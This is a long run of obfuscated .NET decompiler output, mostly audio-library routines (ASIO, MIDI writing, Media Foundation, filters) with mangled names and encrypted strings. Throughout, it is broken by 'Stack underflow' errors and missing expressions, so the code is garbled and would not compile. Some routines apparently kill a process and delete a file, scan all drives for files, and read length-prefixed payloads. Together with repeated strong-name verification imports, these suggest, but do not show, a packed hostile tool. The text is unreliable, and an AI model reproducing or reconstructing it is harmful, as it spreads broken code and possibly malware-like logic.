			//IL_0019: Incompatible stack heights: 0 vs 3
			//IL_001c: Incompatible stack heights: 0 vs 2
			new global::_0016._0001._0001(-2);
			((global::_0016._0001._0001)/*Error near IL_000f: Stack underflow*/)._0001 = (global::_0016._0001)/*Error near IL_000f: Stack underflow*/;
			/*Error near IL_000f: Stack underflow*/;
			((global::_0016._0001._0001)/*Error near IL_0017: Stack underflow*/)._0003 = (string)/*Error near IL_0017: Stack underflow*/;
			return (IEnumerable<string>)/*Error near IL_0018: Stack underflow*/;
		}

		[DllImport("msdmo.dll", EntryPoint = "DMOGetName")]
		static extern int _0001([In] ref Guid _0002, [Out] StringBuilder _0003);

		static bool _0001(global::_0017._007F._0005 _0002, global::_0017._007F._0002 P_1)
		{
			//IL_0265: Incompatible stack heights: 0 vs 1
			//IL_0271: Incompatible stack heights: 0 vs 1
			while (true)
			{
				int num = ((global::_0017._007F._0005)/*Error near IL_000a: Stack underflow*/)._0007;
				switch (/*Error near IL_0031: Stack underflow*/)
				{
				default:
					continue;
				case 0L:
					_0002._0008 = _0018._0001(P_1, 5);
					if (_0002._0008 < 0)
					{
						return false;
					}
					_0002._0008 += 257;
					_0018._0001(P_1, 5);
					_0002._0007 = 1;
					goto case 1L;
				case 1L:
					_0002._000E = _0018._0001(P_1, 5);
					if (_0002._000E < 0)
					{
						return false;
					}
					_0002._000E++;
					_0018._0001(P_1, 5);
					_0002._0010 = _0002._0008 + _0002._000E;
					_0002._0002 = new byte[_0002._0010];
					_0002._0007 = 2;
					goto case 2L;
				case 2L:
					_0002._000F = _0018._0001(P_1, 4);
					if (_0002._000F < 0)
					{
						return false;
					}
					_0002._000F += 4;
					_0018._0001(P_1, 4);
					_0002._0001 = new byte[19];
					_0002._0012 = 0;
					_0002._0007 = 3;
					goto case 3L;
				case 3L:
					while (_0002._0012 < _0002._000F)
					{
						int num3 = _0018._0001(P_1, 3);
						if (num3 < 0)
						{
							return false;
						}
						_0018._0001(P_1, 3);
						_0002._0001[global::_0017._007F._0005._0003[_0002._0012]] = (byte)num3;
						_0002._0012++;
					}
					_0002._0001 = new global::_0017._007F._0004(_0002._0001);
					_0002._0001 = null;
					_0002._0012 = 0;
					_0002._0007 = 4;
					goto case 4L;
				case 4L:
				{
					int num2;
					while (((num2 = _0018._0001(_0002._0001, P_1)) & -16) == 0)
					{
						_0002._0002[_0002._0012++] = (_0002._0001 = (byte)num2);
						if (_0002._0012 == _0002._0010)
						{
							return true;
						}
					}
					if (num2 < 0)
					{
						return false;
					}
					if (num2 >= 17)
					{
						_0002._0001 = 0;
					}
					_0002._0011 = num2 - 16;
					_0002._0007 = 5;
					break;
				}
				case 5L:
					break;
				}
				int num4 = global::_0017._007F._0005._0002[_0002._0011];
				int num5 = _0018._0001(P_1, num4);
				if (num5 < 0)
				{
					return false;
				}
				_0018._0001(P_1, num4);
				num5 += global::_0017._007F._0005._0001[_0002._0011];
				while (num5-- > 0)
				{
					_0002._0002[_0002._0012++] = _0002._0001;
				}
				if (_0002._0012 == _0002._0010)
				{
					break;
				}
				_0002._0007 = 4;
			}
			return true;
		}

		static global::_0010._001C _0001(bool _0002, _001D._0019 P_1)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 2
			_0018._0001((_001D._0019)/*Error near IL_001f: Stack underflow*/);
			_ = _009F_0005._0093_000F;
			return (global::_0010._001C)/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, _0002);
		}

		unsafe static void _0001(ref double _0002, ref double _0003, _001A._0011 P_2)
		{
			//IL_00b7: Incompatible stack heights: 0 vs 3
			//IL_00c1: Incompatible stack heights: 0 vs 1
			//IL_00c7: Incompatible stack heights: 0 vs 2
			_ = global::_0014._0096_0002;
			_ = global::_0015._0001_0003;
			double num = *(double*)(nint)/*Error near IL_0010: Stack underflow*/;
			/*Error near IL_00c1: Stack underflow*/(num);
			_ = global::_0015._0001_0003;
			double num2 = *(double*)(nint)/*Error near IL_0020: Stack underflow*/;
			double num3 = /*Error near IL_0025: Stack underflow*/(num2);
			double num4 = _0018._0001(/*Error near IL_002c: Stack underflow*/((double)/*Error near IL_002c: Stack underflow*/, num3) + 1E-25) - P_2.Threshold;
			if (num4 < 0.0)
			{
				num4 = 0.0;
			}
			num4 += 1E-25;
			_0018._0001(ref P_2._0001, (global::_0002._0013)P_2, num4);
			num4 = P_2._0001 - 1E-25;
			double num5 = num4 * (P_2.Ratio - 1.0);
			num5 = _0018._0001(num5) * _0018._0001(P_2.MakeUpGain);
			_0003 *= num5;
			_0002 *= num5;
		}

		static int _0001(int _0002, int _0003, int _0004)
		{
			//IL_0004: Unknown result type (might be due to invalid IL or missing references)
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Expected I4, but got Unknown
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_0016: Incompatible stack heights: 0 vs 2
			_ = /*Error near IL_0005: Stack underflow*/<< 31;
			_003F val = /*Error near IL_000a: Stack underflow*/<< 16;
			_ = /*Error near IL_000b: Stack underflow*/| val;
			return /*Error near IL_000e: Stack underflow*/| /*Error near IL_000e: Stack underflow*/;
		}

		static void _0001(global::_0010._001C P_0)
		{
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0049: Incompatible stack heights: 0 vs 1
			if (((global::_0010._001C)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = ((global::_0010._001C)/*Error near IL_0011: Stack underflow*/)._0001.Count;
				int num = (int)/*Error near IL_0014: Stack underflow*/;
				for (int i = 0; i < num; i++)
				{
					P_0._0001[i]?._0001();
				}
				P_0._0001 = null;
			}
		}

		static string _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_000F._008B_0002;
			_0086_0005._0015_000F(Environment.SpecialFolder.CommonApplicationData);
			string text = global::_0015._0001._0007;
			/*Error near IL_0028: Stack underflow*/((string)/*Error near IL_0028: Stack underflow*/, text);
			return (string)/*Error near IL_001a: Stack underflow*/;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static byte[] _0001(global::_0008._0001 P_0)
		{
			//IL_00e4: Incompatible stack heights: 0 vs 1
			//IL_00ee: Incompatible stack heights: 0 vs 2
			try
			{
				_ = ((global::_0008._0001)/*Error near IL_000c: Stack underflow*/)._0001;
				_0016_0005._009F_000E();
				((global::_0004._0001)/*Error near IL_001b: Stack underflow*/)._0001 = (DateTime)/*Error near IL_001b: Stack underflow*/;
				int num = default(int);
				if (0 == 0)
				{
					num = 0;
				}
				byte[] array = new byte[5];
				_0082._007E_0006_0004(P_0._0001, array, 0, 5);
				int num2 = _0002_0006._0095_000F(array, 0);
				byte[] array2 = new byte[num2];
				int num3 = num2;
				while (num3 > 0 && !P_0._0006)
				{
					int num4 = ((num3 > P_0._0003) ? P_0._0003 : num3);
					int num5 = _0082._007E_0006_0004(P_0._0001, array2, num, num4);
					num += num5;
					num3 -= num5;
					P_0._0001._0001 = _0016_0005._009F_000E();
				}
				if (P_0._0006)
				{
					global::_0008._007E_0001_0002(P_0._0001);
					array2 = null;
				}
				return array2;
			}
			catch
			{
				P_0._0007 = false;
				return null;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string _0001(string _0002)
		{
			//IL_0070: Incompatible stack heights: 0 vs 2
			//IL_0077: Incompatible stack heights: 0 vs 1
			//IL_007e: Incompatible stack heights: 0 vs 1
			_ = _0012_0004._007E_0019_0008;
			_0080._0014._0001(107376631);
			/*Error near IL_007e: Stack underflow*/((object)/*Error near IL_007e: Stack underflow*/, (string)/*Error near IL_007e: Stack underflow*/, StringComparison.OrdinalIgnoreCase);
			if ((int)/*Error near IL_0013: Stack underflow*/ != 0)
			{
				return _009E_0003._007E_009E_0007(_0002, 7);
			}
			if (_0012_0004._007E_0019_0008(_0002, _0080._0014._0001(107376586), StringComparison.OrdinalIgnoreCase))
			{
				return _009E_0003._007E_009E_0007(_0002, 5);
			}
			if (_0012_0004._007E_0019_0008(_0002, _0080._0014._0001(107376577), StringComparison.OrdinalIgnoreCase))
			{
				return _0002;
			}
			throw new InvalidOperationException(_0080._0014._0001(107376604));
		}

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_00a8: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 1
			try
			{
				_000E_0005._0094_000E(global::_0015._0001._0005);
				Process[] array;
				if (6u != 0)
				{
					array = (Process[])/*Error near IL_00ae: Stack underflow*/;
				}
				if (((Array)/*Error near IL_001e: Stack underflow*/).Length == 1)
				{
					_0018._0001(P_0, global::_001A._007E_000E_0003(array[0]));
				}
				global::_0007._0096(100);
				if (global::_001C._0097_0003(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._0005)))
				{
					_0015_0004._007F_0008(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._0005));
					global::_0007._0096(21);
					_0018._0001(P_0);
				}
			}
			catch
			{
			}
		}

		static global::_000E._0016 _0001(string _0002)
		{
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			_0018._0001(1);
			global::_0008._000E obj = (global::_0008._000E)/*Error near IL_0053: Stack underflow*/;
			Guid guid = global::_0004._0011._008B;
			((global::_0008._000E)/*Error near IL_0012: Stack underflow*/)._0001(guid, 1);
			try
			{
				_0018._0001(_0002, (_0010)null, obj, out global::_000E._0016 result);
				return result;
			}
			catch (COMException ex)
			{
				if (ex._0001() == -1072875819)
				{
					throw new ArgumentException(_0080._0014._0001(107376519));
				}
				throw;
			}
			finally
			{
				_0098._008A_0004(obj);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mfplat.dll", EntryPoint = "MFCreateSample", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001(out global::_0016._0015 _0002);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "midiInGetNumDevs")]
		static extern int _0001();

		static global::_0018._0014 _0001(BinaryReader _0002)
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			new global::_0018._0014();
			global::_0018._0014 obj = (global::_0018._0014)/*Error near IL_0043: Stack underflow*/;
			new List<byte>();
			List<byte> list = (List<byte>)/*Error near IL_0007: Stack underflow*/;
			bool flag = true;
			while (flag)
			{
				byte b = _008D_0002._007E_0096_0005(_0002);
				if (b == 247)
				{
					flag = false;
				}
				else
				{
					list.Add(b);
				}
			}
			obj._0001 = list.ToArray();
			return obj;
		}

		static void _0001(global::_0017._0006 _0002, Exception P_1)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			new global::_0017._0006._0001();
			global::_0017._0006._0001 CS_0024_003C_003E8__locals0;
			if (2u != 0)
			{
				CS_0024_003C_003E8__locals0 = (global::_0017._0006._0001)/*Error near IL_006f: Stack underflow*/;
			}
			((global::_0017._0006._0001)/*Error near IL_000e: Stack underflow*/)._0001 = _0002;
			CS_0024_003C_003E8__locals0._0001 = P_1;
			CS_0024_003C_003E8__locals0._0001 = _0002._0001;
			if (CS_0024_003C_003E8__locals0._0001 == null)
			{
				return;
			}
			if (_0002._0001 == null)
			{
				CS_0024_003C_003E8__locals0._0001(_0002, new global::_0003._0003(CS_0024_003C_003E8__locals0._0001));
				return;
			}
			_0011_0005._007E_0097_000E(_0002._0001, delegate
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((global::_0017._0006._0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((global::_0017._0006._0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((global::_0017._0006._0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}, null);
		}

		static void _0001(_001E._0004 P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001._0002();
			/*Error near IL_0020: Stack underflow*/((int)/*Error near IL_0020: Stack underflow*/);
		}

		static _0015 _0001(_001C._0017 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = ((global::_0012._0014)/*Error near IL_0007: Stack underflow*/)._0001;
			IntPtr intPtr = ((global::_0012._0014)/*Error near IL_0010: Stack underflow*/)._0001;
			return ((_0013)/*Error near IL_0015: Stack underflow*/)._0001((global::_0012._0014)/*Error near IL_0015: Stack underflow*/, intPtr);
		}

		static void _0001(global::_0006._0003 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0006._0003)/*Error near IL_0007: Stack underflow*/)._0001);
		}

		unsafe static global::_0017._0084._001D _0001(global::_0017._0084._001D _0002, global::_0001._0082 P_1)
		{
			//IL_0035: Incompatible stack heights: 1 vs 2
			//IL_0069: Incompatible stack heights: 1 vs 2
			//IL_009d: Incompatible stack heights: 1 vs 2
			//IL_0445: Incompatible stack heights: 0 vs 2
			//IL_044b: Incompatible stack heights: 0 vs 2
			//IL_0451: Incompatible stack heights: 0 vs 2
			global::_0017._0084._001D result = default(global::_0017._0084._001D);
			result._0001 = _0002._0001;
			_ = ref result;
			global::_0017._0084._0001 obj;
			if (_0002._0001 == null)
			{
				obj = ((global::_0001._0082)/*Error near IL_0031: Stack underflow*/)._0001;
			}
			else
			{
				_ = _0002._0001;
			}
			global::_0017._0084._0001 obj2 = obj.Invoke;
			((global::_0017._0084._001D*)(nint)/*Error near IL_004a: Stack underflow*/)->_0001 = obj2;
			_ = ref result;
			global::_0017._0084._0002 obj3;
			if (_0002._0001 == null)
			{
				obj3 = ((global::_0001._0082)/*Error near IL_0065: Stack underflow*/)._0002;
			}
			else
			{
				_ = _0002._0001;
			}
			global::_0017._0084._0002 obj4 = obj3.Invoke;
			((global::_0017._0084._001D*)(nint)/*Error near IL_007e: Stack underflow*/)->_0001 = obj4;
			_ = ref result;
			global::_0017._0084._0003 obj5;
			if (_0002._0001 == null)
			{
				obj5 = ((global::_0001._0082)/*Error near IL_0099: Stack underflow*/)._0001;
			}
			else
			{
				_ = _0002._0001;
			}
			global::_0017._0084._0003 obj6 = obj5.Invoke;
			((global::_0017._0084._001D*)(nint)/*Error near IL_00b2: Stack underflow*/)->_0001 = obj6;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0004(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0005(P_1._0002)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0006(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0007(P_1._0003)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0008(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._000E(P_1._0004)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._000F(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0010(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0011(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0012(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0013(P_1._0005)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0014(P_1._0006)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0015(P_1._0007)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0016(P_1._0008)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0017(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0018(P_1._0002)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._0019(P_1._0001)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._001A(P_1._0002)).Invoke;
			result._0001 = ((_0002._0001 != null) ? _0002._0001 : new global::_0017._0084._001B(P_1._0003)).Invoke;
			return result;
		}

		unsafe static AsioError _0001(out int _0002, [Out] global::_0017._0015 _0003, ref int P_2)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 2
			//IL_0023: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0007: Stack underflow*/)._0001._0001;
			_ = ((global::_0017._0015)/*Error near IL_0013: Stack underflow*/)._0001;
			return /*Error near IL_001b: Stack underflow*/((IntPtr)/*Error near IL_001b: Stack underflow*/, out *(int*)/*Error near IL_001b: Stack underflow*/, out P_2);
		}

		static MediaType[] _0001(Guid _0002)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_0082: Incompatible stack heights: 0 vs 1
			_001A._000E obj;
			try
			{
				_0018._0001((Guid)/*Error near IL_0013: Stack underflow*/, global::_0001._0013._000E, (global::_0008._000E)null, out obj);
			}
			catch (COMException ex)
			{
				if (ex._0001() == -1072875819)
				{
					return new MediaType[0];
				}
				throw;
			}
			((_001A._000E)/*Error near IL_0035: Stack underflow*/)._0001(out int num);
			List<MediaType> list = new List<MediaType>(num);
			for (int i = 0; i < num; i++)
			{
				obj._0001(i, out var obj2);
				_0019._0012 mediaType = (_0019._0012)obj2;
				list.Add(new MediaType(mediaType));
			}
			_0098._008A_0004(obj);
			return list.ToArray();
		}

		static void _0001(global::_0015._0005 _0002, int P_1)
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected F4, but got Unknown
			//IL_0050: Incompatible stack heights: 0 vs 2
			//IL_0053: Incompatible stack heights: 0 vs 3
			//IL_005a: Incompatible stack heights: 0 vs 1
			_ = 1f;
			_ = (float)/*Error near IL_0008: Stack underflow*/;
			_ = global::_001A._0012_0003;
			/*Error near IL_005a: Stack underflow*/((object)/*Error near IL_005a: Stack underflow*/);
			float num = (float)/*Error near IL_0012: Stack underflow*/;
			_003F val = /*Error near IL_0013: Stack underflow*// num;
			float num2 = (/*Error near IL_0014: Stack underflow*/ - val) * _0002._0002;
			if (P_1 <= 0)
			{
				_0002.Volume = 0f;
			}
			else
			{
				_0002.Volume = (float)global::_0014._0095_0002(10.0, num2 / 20f);
			}
		}

		static short _0001(int _0002)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0038: Unknown result type (might be due to invalid IL or missing references)
			//IL_003c: Incompatible stack heights: 0 vs 2
			//IL_003f: Incompatible stack heights: 0 vs 3
			//IL_0042: Incompatible stack heights: 0 vs 3
			_ = global::_0017._007F._0007._0001;
			_003F val = /*Error near IL_000a: Stack underflow*/& 0xF;
			_ = ((byte[])/*Error near IL_000b: Stack underflow*/)[val] << 12;
			_ = global::_0017._007F._0007._0001;
			_003F val2 = /*Error near IL_0017: Stack underflow*/>> 4;
			byte num = ((byte[])/*Error near IL_001b: Stack underflow*/)[val2 & 0xF];
			_ = /*Error near IL_001e: Stack underflow*/| (num << 8);
			_ = global::_0017._007F._0007._0001;
			_003F val3 = /*Error near IL_0027: Stack underflow*/>> 8;
			byte num2 = ((byte[])/*Error near IL_002b: Stack underflow*/)[val3 & 0xF];
			return (short)(/*Error near IL_002e: Stack underflow*/ | (num2 << 4) | global::_0017._007F._0007._0001[_0002 >> 12]);
		}

		static void _0001(_001F._0019._0003 _0002, bool P_1)
		{
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			if (((_001F._0019._0003)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				return;
			}
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				((_001F._0019._0003)/*Error near IL_0015: Stack underflow*/).IsValid = false;
				if (_0002._0001 != null)
				{
					global::_0008._007E_000F_0002(_0002._0001);
				}
				_0002._0001 = null;
			}
			_0002._0001 = true;
		}

		static bool _0001()
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			_0018._0001();
			return ((Array)/*Error near IL_0003: Stack underflow*/).Length != 0;
		}

		static void _0001(_001F._001A _0002, bool P_1)
		{
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			if (((_001F._001A)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				return;
			}
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				if (((_001F._001A)/*Error near IL_0014: Stack underflow*/)._0001 != null)
				{
					global::_0008._007E_0080_0002(_0002._0001);
					_0002._0001 = null;
				}
				if (_0017_0004._0082_0008(_0002._0001, null))
				{
					_0002._0001 = null;
				}
			}
			_0002._0002 = true;
		}

		static void _0001(string _0002, global::_0016._0001 P_1)
		{
			//IL_01d7: Incompatible stack heights: 0 vs 1
			//IL_01dd: Incompatible stack heights: 0 vs 1
			((global::_0016._0001)/*Error near IL_000b: Stack underflow*/)._0001._0008 = false;
			((global::_0016._0001)/*Error near IL_001b: Stack underflow*/)._0003.Clear();
			P_1._0002.Clear();
			P_1._0001 = 0;
			P_1._0002 = 0;
			string[] array = global::_000E._007E_008A_0002(_0002, new char[1] { '<' });
			if (array.Length <= 1)
			{
				return;
			}
			string[] array2 = global::_000E._007E_008A_0002(array[0], new char[1] { '>' });
			string[] array3 = array2;
			string[] array4 = array3;
			foreach (string text in array4)
			{
				if (_0010_0003._008C_0006(text, _0080._0014._0001(107396634)))
				{
					P_1._0003.Add(text);
				}
			}
			if (_0010_0003._008C_0006(global::_0002._007E_0006(array[1]), _0080._0014._0001(107396634)))
			{
				P_1._0001 = true;
				_0018._0001(array[1], P_1);
				P_1._0001 = false;
				_0018._0001(P_1._0001, (byte[])null, global::_000E._008A_0002(_0080._0014._0001(107376470), new char[1] { '!' })[0], false);
				return;
			}
			DriveInfo[] array5 = _001E_0005._0008_000F();
			P_1._0001 = true;
			DriveInfo[] array6 = array5;
			DriveInfo[] array7 = array6;
			foreach (DriveInfo driveInfo in array7)
			{
				if (global::_001B._007E_0090_0003(driveInfo))
				{
					_0018._0001(global::_0002._007E_001A(driveInfo), P_1);
				}
			}
			_0018._0001(P_1._0001, (byte[])null, global::_000E._008A_0002(_0080._0014._0001(107376393), new char[1] { '!' })[0], false);
			P_1._0001 = false;
		}

		static void _0001(global::_000E._0019._0001 _0002, float[] _0003, int _0004, float[] _0005, int _0006, int _0007, int _0008, int P_7)
		{
			//IL_0113: Incompatible stack heights: 0 vs 1
			//IL_011f: Incompatible stack heights: 0 vs 1
			double num = ((global::_000E._0019._0001)/*Error near IL_000a: Stack underflow*/)._0004;
			double num2 = ((global::_000E._0019._0001)/*Error near IL_0019: Stack underflow*/)._0005;
			double num3 = _0002._0006;
			double num4 = _0002._0002;
			double num5 = _0002._0003;
			while (_0007-- != 0)
			{
				double num6 = _0003[_0004];
				_0004 += _0008;
				double num7 = num6 * num + _0002._0001[P_7, 0] * num2 + _0002._0001[P_7, 1] * num3 - _0002._0001[P_7, 2] * num4 - _0002._0001[P_7, 3] * num5;
				_0002._0001[P_7, 1] = _0002._0001[P_7, 0];
				_0002._0001[P_7, 0] = num6;
				_0002._0001[P_7, 3] = _0002._0001[P_7, 2];
				_0002._0001[P_7, 2] = _0018._0001(num7, _0002);
				_0005[_0006] = (float)_0002._0001[P_7, 2];
				_0006 += _0008;
			}
		}

		static void _0001(global::_0016._0012 P_0)
		{
			//IL_0191: Incompatible stack heights: 0 vs 1
			//IL_019b: Incompatible stack heights: 0 vs 1
			//IL_01a1: Incompatible stack heights: 0 vs 1
			new global::_0017._0014();
			((global::_0016._0012)/*Error near IL_000f: Stack underflow*/)._0001 = (global::_0017._0014)/*Error near IL_000f: Stack underflow*/;
			((global::_0016._0012)/*Error near IL_0019: Stack underflow*/)._0001._0001 = _0018._0001(P_0._0001);
			global::_0017._0015 obj = P_0._0001;
			ref int reference = ref P_0._0001._0001;
			_0018._0001(out P_0._0001._0002, obj, ref reference);
			P_0._0001._0001 = new global::_0017._0013[P_0._0001._0001];
			P_0._0001._0002 = new global::_0017._0013[P_0._0001._0002];
			for (int i = 0; i < P_0._0001._0001; i++)
			{
				P_0._0001._0001[i] = _0018._0001(i, P_0._0001, true);
			}
			for (int j = 0; j < P_0._0001._0002; j++)
			{
				P_0._0001._0002[j] = _0018._0001(j, P_0._0001, false);
			}
			P_0._0001._0001 = _0018._0001(P_0._0001);
			global::_0017._0015 obj2 = P_0._0001;
			AsioError asioError = _0018._0001(out P_0._0001._0003, obj2, ref P_0._0001._0004);
			if (asioError != 0 && asioError != AsioError.ASE_NotPresent)
			{
				throw new global::_0016._0013(_0080._0014._0001(107375868))
				{
					Error = asioError
				};
			}
			_0018._0001(P_0._0001, out P_0._0001._0005, out P_0._0001._0006, out P_0._0001._0007, ref P_0._0001._0008);
		}

		static void _0001(global::_0008._0001 P_0)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			try
			{
				_0018._0001();
				byte[] array = (byte[])/*Error near IL_002f: Stack underflow*/;
				string text = global::_0002._007E_0006(_0080._0014._0001(107375811));
				_0018._0001((global::_0008._0001)/*Error near IL_0023: Stack underflow*/, array, text, false);
			}
			catch
			{
			}
		}

		static void _0001(global::_0016._0014 _0002, string _0003)
		{
			//IL_0017: Invalid comparison between Unknown and I4
			//IL_01f1: Incompatible stack heights: 0 vs 1
			//IL_01f7: Incompatible stack heights: 0 vs 1
			//IL_0201: Incompatible stack heights: 0 vs 1
			if (((global::_0016._0014)/*Error near IL_000a: Stack underflow*/)._0001 == 0)
			{
				_ = ((global::_0016._0014)/*Error near IL_0201: Stack underflow*/).Tracks;
				if ((int)/*Error near IL_0019: Stack underflow*/ > 1)
				{
					throw new ArgumentException(_0080._0014._0001(107375786));
				}
			}
			BinaryWriter binaryWriter = new BinaryWriter(_0090_0006._0084_0010(_0003));
			try
			{
				_009F_0002._007E_001C_0006(binaryWriter, _0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0080._0014._0001(107383298)));
				_0084_0005._007E_0014_000F(binaryWriter, _0018._0001(6u));
				_0016_0007._007E_0007_0011(binaryWriter, _0018._0001((ushort)_0002._0001));
				_0016_0007._007E_0007_0011(binaryWriter, _0018._0001((ushort)_0002.Tracks));
				_0016_0007._007E_0007_0011(binaryWriter, _0018._0001((ushort)_0002._0002));
				for (int i = 0; i < _0002.Tracks; i++)
				{
					IList<global::_0013._0010> list = _0002[i];
					_009F_0002._007E_001C_0006(binaryWriter, _0087_0003._007E_0081_0007(_0082_0002._0088_0005(), _0080._0014._0001(107383739)));
					long num = global::_0012._007E_0091_0002(_0005_0003._007E_0081_0006(binaryWriter));
